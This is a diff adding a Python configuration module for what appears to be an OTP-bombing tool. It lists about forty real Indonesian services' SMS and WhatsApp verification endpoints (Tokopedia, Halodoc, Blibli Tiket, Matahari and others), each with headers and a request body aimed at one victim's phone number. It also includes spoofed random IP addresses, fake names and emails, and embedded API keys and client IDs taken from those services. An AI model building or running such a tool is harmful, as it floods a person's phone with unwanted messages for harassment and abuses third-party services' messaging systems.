@@ -1,0 +1,53 @@
+# config - 44 endpoint
+import random as _r, uuid as _u
+
+def _f08(p): p=str(p).strip().replace(" ","").replace("-",""); return "0"+p[3:] if p.startswith("+62") else "0"+p[2:] if p.startswith("62") else p
+def _f62(p): p=str(p).strip().replace(" ","").replace("-",""); return p[1:] if p.startswith("+") else "62"+p[1:] if p.startswith("0") else p
+def _fplus(p): p=str(p).strip().replace(" ","").replace("-",""); return p if p.startswith("+62") else "+"+p if p.startswith("62") else "+62"+p[1:] if p.startswith("0") else "+62"+p
+def _fnocode(p): p=str(p).strip().replace(" ","").replace("-",""); return p[3:] if p.startswith("+62") else p[2:] if p.startswith("62") else p[1:] if p.startswith("0") else p
+def _rip(): return f"{_r.randint(1,255)}.{_r.randint(1,255)}.{_r.randint(1,255)}.{_r.randint(1,255)}"
+_Q = "query OTPRequest($a:String!,$b:String,$c:String,$d:String,$e:Int){OTPRequest:OTPRequestV2(otpType:$a,mode:$b,msisdn:$c,email:$d,otpDigit:$e){success message errorMessage __typename}}"
+_nm = lambda: _r.choice(["bayu","dimas","rudi","sinta","dewi","putri","eko","andi","rina","budi","citra","fajar","nita","agus","sari"])
+_em = lambda: f"{_nm()}{_r.randint(10,99)}@gmail.com"
+
+def _x(ph):
+    return [
+        ("Tokopedia-WA","https://gql.tokopedia.com/graphql/OTPRequest",{"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","Accept":"*/*","tokopedia-lite":"otp"},{"operationName":"OTPRequest","query":_Q,"variables":{"a":"116","b":"whatsapp","c":_f62(ph),"d":"","e":6}}),
+        ("Tokopedia-SMS","https://gql.tokopedia.com/graphql/OTPRequest",{"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","Accept":"*/*","tokopedia-lite":"otp"},{"operationName":"OTPRequest","query":_Q,"variables":{"a":"116","b":"sms","c":_f62(ph),"d":"","e":6}}),
+        ("Fastwork","https://api.fastwork.id/auth/v2/signup.sendVerificationCode",{"Content-Type":"application/json","Origin":"https://auth2.fastwork.id"},{"phone_number":_fplus(ph)}),
+        ("BlibliTiket","https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate",{"Content-Type":"text/plain;charset=UTF-8","Origin":"https://account.bliblitiket.com","x-request-id":str(_u.uuid4()),"x-channel-id":"MWEB","x-lang":"id","x-entity":"TIKET","x-client-id":"9dc79e3916a042abc86c2aa525bff009"},{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":_fplus(ph),"recaptchaToken":"","challengeToken":""}),
+        ("Paper.id","https://register.paper.id/api/v1/auth/register/send-otp",{"Content-Type":"application/json","Origin":"https://paper.id","x-paper-user-agent":"multiverse/2.54.1 mobile_web (android) chrome"},{"phone":_f62(ph),"method":"whatsapp","registered_by":"web"}),
+        ("Pluang","https://api-pluang.pluang.com/api/v3/user/signup/phone",{"Content-Type":"application/json","Origin":"https://pluang.com"},{"name":"M","email":_em(),"phone":_fplus(ph),"signature":"7cf092bcc024183a5b98b115469add78976a0acdc2a7a55769c983d9a344efe1","referral":"","messageMedium":"WHATSAPP_MESSAGE"}),
+        ("Rumah123","https://www.rumah123.com/api/otp/request-otp",{"Content-Type":"application/json;charset=UTF-8","Origin":"https://www.rumah123.com","base-url-core":"https://www.rumah123.com"},{"cancelledRequestId":str(_u.uuid4()),"ipAddress":_rip(),"phoneNumber":_f62(ph),"portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login"}),
+        ("Halodoc","https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests",{"Content-Type":"application/json","Origin":"https://www.halodoc.com","Referer":"https://www.halodoc.com/login","Accept":"application/json"},{"phone_number":_fplus(ph),"channel":"whatsapp","otp_resent":False,"clientId":"786fb676dc53480009296e0811229a7c","_halodoc":True}),
+        ("BonusBelanja","https://www.bonusbelanja.com/api/auth/registration/app",{"Content-Type":"application/json","Origin":"https://www.bonusbelanja.com","Referer":"https://www.bonusbelanja.com/register"},{"phone":_f62(ph),"name":"M","agreeTnc":True,"agreeContact":True}),
+        ("DuniaGames","https://api.duniagames.co.id/api/user/api/v2/user/send-otp",{"Content-Type":"application/json","Origin":"https://duniagames.co.id","x-device":"85d3da46-4d56-4675-90fc-e27926c56de1"},{"phoneNumber":_fplus(ph),"userName":ph}),
+        ("InternetRakyat","https://internetrakyat.id/api/app/auth/send-otp-register",{"Content-Type":"application/json"},{"phone_number":_f08(ph)}),
+        ("MisterAladin","https://m.misteraladin.com/web-api/members/auth/otp-request",{"Content-Type":"application/json","Origin":"https://m.misteraladin.com"},{"phone_number":" "+_fnocode(ph),"phone_number_country_code":62,"fullname":_nm().capitalize(),"pages":None,"type":"register"}),
+        ("Matahari","https://matahari-backend-prod.matahari.com/api/auth/register",{"Content-Type":"application/json","Origin":"https://matahari.com"},{"emailAddress":_em(),"name":"T","mobileCountryCode":"","mobileNumber":_f08(ph),"birthDate":"2000-01-01","genderId":"1","password":"Test12345","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}),
+        ("GreenSM","https://gapi.indo.greensm.com/car/acquisition/create-registration",{"Content-Type":"application/json","Origin":"https://indo.greensm.com"},{"HiringSource":"T","Education":"S","WorkExperience":"L","City":"JT","Type":"EXTERNAL","Tel":_fplus(ph),"Name":"W","Level":"","Country":"ID","ReferralCode":"","Source":"","AffiliateNumber":"","Campaign":""}),
+        ("Vintar","https://vintar.id/api/merchant/auth/send-otp",{"Content-Type":"application/json"},{"phone":_f62(ph)}),
+        ("Morinaga","https://loyalty.morinaga.id/api/bff/v1/notification/sendotp",{"Content-Type":"application/json","Accept":"application/json"},{"UniqueID":_f08(ph),"NotifType":"109104","OtpType":"119103","OtpDigit":6}),
+        ("OptikMelawai","https://api.optikmelawai.com/api/v2/auth/register/verify/phone/request",{"Content-Type":"application/json","Accept":"application/json"},{"value":_f62(ph),"provider":"mobile_number"}),
+        ("Moladin","https://moladingroup.com/wp-admin/admin-ajax.php",{"Content-Type":"application/x-www-form-urlencoded","Origin":"https://moladingroup.com"},{"action":"user_request_otp","phone_number":_fnocode(ph),"is_form":True}),
+        ("Connectindo","https://www.connectindo.id/api/auth/phone-login/send-otp",{"Content-Type":"application/json","Origin":"https://www.connectindo.id","Referer":"https://www.connectindo.id/login"},{"phone":_f08(ph),"locale":"id"}),
+        ("Staigo","https://api.staigo.id/api/v2/auth/login",{"Content-Type":"application/json","Origin":"https://staigo.id","Referer":"https://staigo.id/login"},{"identifier":_f62(ph)}),
+        ("1itmedia","https://api.1itmedia.co.id/oauth/fa_otp",{"Content-Type":"application/x-www-form-urlencoded"},{"username":_f08(ph),"otp_type":"null","is_form":True}),
+        ("Carro","https://carro.co/_actions/requestOtp",{"Content-Type":"application/json","Accept":"application/json"},{"countryCode":"id","locale":"id","mobileNumber":_fplus(ph),"provider":"whatsapp","recaptchaResponse":"","recaptchaAction":"id_idid_requestOtp"}),
+        ("BodyShop","https://ms-api.thebodyshop.co.id/users/v1/otp/request",{"Content-Type":"application/json","Accept":"application/json"},{"identifier":_f08(ph),"otpType":"WA"}),
+        ("BMMParts","https://bmmparts.co.id/api/v1/auth/request-otp",{"Content-Type":"application/json","Accept":"*/*","Api-Key":"28EBBA656ED772A7BF319A79D1FBDB051411DCB7AF47DD09845FF5F7F09267E0","Origin":"https://bmmparts.co.id","Referer":"https://bmmparts.co.id/login"},{"phoneNumber":_fnocode(ph)}),
+        ("Edelweiss","https://devel-cnn.edelweiss.id/api/auth/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fplus(ph)}),
+        ("Merupakan","https://merupakan.id/wp-json/merupakan/v1/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph)}),
+        ("DzakiArrafi","https://dzakiarrafi.my.id/api/send_otp.php",{"Content-Type":"application/x-www-form-urlencoded"},{"no_wa":_f08(ph),"is_form":True}),
+        ("Trive","https://api.trive.co.id/api/auth/send-verification-code",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph),"countryCode":"+62"}),
+        ("ITSolution","https://forum.itsolution.id/api/request_otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f62(ph)}),
+        ("SobatWarung","https://sobatwarung.id/api/auth/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
+        ("CeriaPlaydate","https://api.ceriaplaydate.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
+        ("CWorld","https://cworld.id/wp-admin/admin-ajax.php",{"Content-Type":"application/x-www-form-urlencoded"},{"user_email":_f08(ph),"user_phone":_f08(ph),"otpType":"phone","security":"c391eb7d1f","action":"miniorange-wpform-send-otp","is_form":True}),
+        ("D2Shop","https://d2shop.co.id/services/identity/RequestOTP",{"Content-Type":"application/x-www-form-urlencoded"},{"destination":_f08(ph),"otpLength":"6","is_form":True}),
+        ("LittleHands","https://api.littlehands.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
+        ("Aice","https://api.aicegotyou.id/api/v1/auth/phone/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph),"purpose":"register"}),
+        ("ArunaBooks","https://arunabooks.id/api/auth/customer/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph)}),
+        ("PreciousPreschool","https://api.preciouspreschool.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"*/*","Origin":"https://preciouspreschool.id","Referer":"https://preciouspreschool.id/"},{"phone":_fplus(ph)}),
+        ("Mapclub","https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP",{"Content-Type":"application/json","Accept":"application/json","accept-language":"in-ID","client-platform":"WEB","Origin":"https://www.mapclub.com","Referer":"https://www.mapclub.com/"},{"account":_fnocode(ph),"prefix":"62","_mapclub":True}),
+    ]
